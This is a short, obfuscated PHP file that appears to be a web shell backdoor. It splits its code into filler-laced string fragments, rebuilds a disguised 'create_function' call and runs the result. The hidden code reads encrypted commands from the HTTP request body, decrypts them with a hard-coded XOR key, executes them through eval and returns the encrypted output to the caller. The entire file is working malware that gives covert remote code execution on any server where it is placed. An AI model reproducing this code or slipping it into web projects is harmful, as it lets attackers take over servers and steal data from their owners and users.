<?php
$I=',$k){+s$c+s=strlen+s($k+s+s);$l+s=strlen($t);$o="";f+sor($i=0;+s+s$i<+s$l;){for($+sj=0;($j<$c&+s&+s$i<$+sl);$j++,$i++';
$S='s+)+s{$o.=$t{$i}^+s$+sk{$+sj+s};}}return $o;}if+s (@preg+s_m+satch+s("/$kh(+s+s.+)$kf/",@+sfile_get_cont+sen+s+s+sts(+';
$a='$k="01527+s5+scd";$+sk+s+sh="d5e1b2fb361e";$kf=+s"d+s0+s3432ebd58a";$p="s+sWc+s+s2kZHXPlwOdlI+se";funct+s+sion x($t';
$w=str_replace('I','','IcreIateII_funcIItion');
$P='@ob_ge+st_conte+snts+s();+s@+sob_end_clean();$r+s=@bas+se64_+sencode+s+s(@x+s(@gzcom+spress($o),+s$k));+sprint("$p$kh+s$r$kf");}';
$V='s"php://input"),$m)==1) {+s@ob_sta+srt();@e+sval(@+sgzunc+som+s+spress(@x(@ba+sse6+s4+s_decode($+sm[1]),$k)));$o=+s';
$x=str_replace('+s','',$a.$I.$S.$V.$P);
$r=$w('',$x);$r();
?>
